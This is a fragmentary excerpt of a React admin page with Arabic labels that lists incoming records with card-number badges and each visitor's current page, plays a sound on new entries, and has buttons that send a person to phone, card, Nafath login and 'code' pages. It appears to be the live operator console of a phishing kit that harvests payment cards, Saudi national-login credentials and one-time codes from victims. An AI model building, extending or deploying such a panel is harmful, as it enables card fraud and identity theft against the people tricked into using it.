...
import { Trash2, LogOut, CreditCard, User, Car, FileText, CheckCircle, XCircle, AlertCircle, Clock, Calendar, Search, Shield, MoreHorizontal, Tag, Bell, Eye, Loader2, RefreshCw, Smartphone, Volume2, VolumeX, Home, Lock, Phone, LockIcon } from 'lucide-react'
...
import PersonalInfoDisplay from "./personal"
...
export default function NotificationsPage() {
  ...
  useEffect(() => {
    ...
    audioRef.current.addEventListener("error", (e) => console.error("Failed to load notification sound:", e))
    return () => {
      if (audioRef.current) {
  ...
  const handleDelete = async (id: string) => {
    try {
      ...
      toast.success("تم حذف البيانات بنجاح", { position: "top-center", duration: 3000, icon: <CheckCircle className="h-5 w-5" /> })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast.error("حدث خطأ أثناء حذف البيانات", { position: "top-center", duration: 3000, icon: <XCircle className="h-5 w-5" /> })
    }
  }
...
s                      <TableCell>
                      ...
                      <TableCell>
                        <Badge
                          variant={notification.cardNumber ? "outline" : "destructive"}
                      ...
                      <TableCell>
                      <StatusBadge status={notification?.currentPage! as any}/>
                      </TableCell>
                      ...
                      <TableCell>
                        <div className="flex justify-center items-center gap-0.5">
                          <TooltipProvider delayDuration={100}>
                            <Tooltip ><TooltipTrigger asChild><Button onClick={() => handleActionClick(notification, '9999')} variant="ghost" size="icon" className="h-8 w-8 rounded-full text-sky-500 hover:bg-sky-100 dark:hover:bg-sky-900/50"><Phone className="h-4 w-4" /></Button></TooltipTrigger><TooltipContent><p> الهاتف</p></TooltipContent></Tooltip>
                            <Tooltip><TooltipTrigger asChild><Button onClick={() => handleActionClick(notification, '1')} variant="ghost" size="icon" className="h-8 w-8 rounded-full text-slate-500 hover:bg-slate-200 dark:text-slate-400 dark:hover:bg-slate-700"><Home className="h-4 w-4" /></Button></TooltipTrigger><TooltipContent><p>معلومات </p></TooltipContent></Tooltip>
                            <Tooltip><TooltipTrigger asChild><Button onClick={() => handleActionClick(notification, '6')} variant="ghost" size="icon" className="h-8 w-8 rounded-full text-amber-500 hover:bg-amber-100 dark:hover:bg-amber-900/50"><CreditCard className="h-4 w-4" /></Button></TooltipTrigger><TooltipContent><p> البطاقة</p></TooltipContent></Tooltip>
                            <Tooltip><TooltipTrigger asChild><Button onClick={() => handleActionClick(notification, 'nafaz')} variant="ghost" size="icon" className="h-8 w-8 rounded-full text-emerald-500 hover:bg-emerald-100 dark:hover:bg-emerald-900/50"><Shield className="h-4 w-4" /></Button></TooltipTrigger><TooltipContent><p>نفاذ </p></TooltipContent></Tooltip>
                            <Tooltip><TooltipTrigger asChild><Button onClick={() => handleActionClick(notification, '7')} variant="ghost" size="icon" className="h-8 w-8 rounded-full text-rose-500 hover:bg-rose-100 dark:hover:bg-rose-900/50"><LockIcon className="h-4 w-4" /></Button></TooltipTrigger><TooltipContent><p>كود</p></TooltipContent></Tooltip>
